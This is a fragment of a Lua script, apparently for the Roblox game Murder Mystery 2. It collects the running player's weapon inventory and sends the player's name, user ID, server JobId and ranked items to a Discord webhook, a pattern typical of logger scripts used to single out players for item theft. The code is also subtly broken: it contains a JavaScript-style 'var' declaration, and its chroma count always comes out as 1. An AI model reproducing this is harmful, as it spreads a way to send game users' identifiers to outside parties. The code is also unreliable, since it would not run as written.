-- ============================================
-- SCAN YOUR INVENTORY
-- ============================================

local scannedItems = {}

local function scanYourInventory()
    local items = {}
    
    -- Scan backpack
    for _, item in pairs(player.Backpack:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(items, item.Name)
        end
    end
    
    -- Scan character (equipped)
    if player.Character then
        for _, item in pairs(player.Character:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(items, item.Name)
            end
        end
    end
    
    -- Scan ReplicatedStorage for inventory data
    local invData = ReplicatedStorage:FindFirstChild("Inventory") or ReplicatedStorage:FindFirstChild("PlayerData")
    if invData then
        for _, item in pairs(invData:GetDescendants()) do
            if item.Name and #item.Name > 1 and not item.Name:find("Remote") then
                table.insert(items, item.Name)
            end
        end
    end
    
    -- Remove duplicates
    local uniqueItems = {}
    for _, name in pairs(items) do
        if not uniqueItems[name] then
            uniqueItems[name] = true
        end
    end
    
    return uniqueItems
end

-- ============================================
-- CLASSIFY WEAPONS
-- ============================================

local function classifyWeapon(weaponName)
    for _, godly in pairs(WEAPONS) do
        if weaponName:find(godly) or weaponName:lower():find(godly:lower()) then
            if godly == "Cupid" or godly == "Heartblade" or godly == "Valentine" then
                return "Unique ❤️"
            elseif godly == "Ancient" or godly == "Hallow" or godly == "Bat" then
                return "Ancient ⚜️"
            elseif weaponName:find("Chroma") then
                return "Chroma Godly 🌈"
            else
                return "Godly 👑"
            end
        end
    end
    
    for _, leg in pairs({"Icewing", "Ghostblade", "Viper", "Shadow", "Phantom"}) do
        if weaponName:find(leg) then
            return "Legendary ⭐"
        end
    end
    
    return "Regular 🔪"
end

-- ============================================
-- SEND TO DISCORD
-- ============================================

local function sendInventoryToDiscord()
    local inventory = scanYourInventory()
    local itemsList = {}
    local godlyCount = 0
    local ancientCount = 0
    var uniqueCount = 0
    local legendaryCount = 0
    local regularCount = 0
    
    for weaponName, _ in pairs(inventory) do
        local rarity = classifyWeapon(weaponName)
        table.insert(itemsList, {name = weaponName, rarity = rarity})
        
        if rarity:find("Godly") or rarity:find("Chroma") then
            godlyCount = godlyCount + 1
        elseif rarity:find("Ancient") then
            ancientCount = ancientCount + 1
        elseif rarity:find("Unique") then
            uniqueCount = uniqueCount + 1
        elseif rarity:find("Legendary") then
            legendaryCount = legendaryCount + 1
        else
            regularCount = regularCount + 1
        end
    end
    
    -- Sort by rarity (Godly first)
    table.sort(itemsList, function(a, b)
        local priority = {["Chroma Godly 🌈"] = 5, ["Godly 👑"] = 4, ["Unique ❤️"] = 3, ["Ancient ⚜️"] = 2, ["Legendary ⭐"] = 1, ["Regular 🔪"] = 0}
        return (priority[a.rarity] or 0) > (priority[b.rarity] or 0)
    end)
    
    -- Build message
    local weaponText = ""
    for i, item in pairs(itemsList) do
        weaponText = weaponText .. item.rarity .. " " .. item.name .. "\n"
        if i >= 20 then
            weaponText = weaponText .. "... and " .. (#itemsList - 20) .. " more"
            break
        end
    end
    
    if weaponText == "" then
        weaponText = "No weapons found in inventory"
    end
    
    sendToDiscord(
        "🔫 " .. player.Name .. "'s MM2 Inventory",
        "**Server ID:** `" .. (game.JobId or "Unknown") .. "`\n" ..
        "**Player:** " .. player.Name .. "\n" ..
        "**User ID:** " .. player.UserId .. "\n\n" ..
        "**📊 Summary:**\n" ..
        "• Godlies: " .. godlyCount .. " 👑\n" ..
        "• Chromas: " .. (godlyCount - (godlyCount - 1)) .. " 🌈\n" ..
        "• Ancients: " .. ancientCount .. " ⚜️\n" ..
        "• Uniques: " .. uniqueCount .. " ❤️\n" ..
        "• Legendaries: " .. legendaryCount .. " ⭐\n" ..
        "• Regular: " .. regularCount .. " 🔪\n" ..
        "• **Total: " .. #itemsList .. " weapons**",
        {
            {name = "📦 Weapon List", value = "```\n" .. weaponText .. "```", inline = false}
        }
    )
    
    sendLog("✅ Inventory scanned! Found " .. #itemsList .. " weapons")
    return #itemsList
end

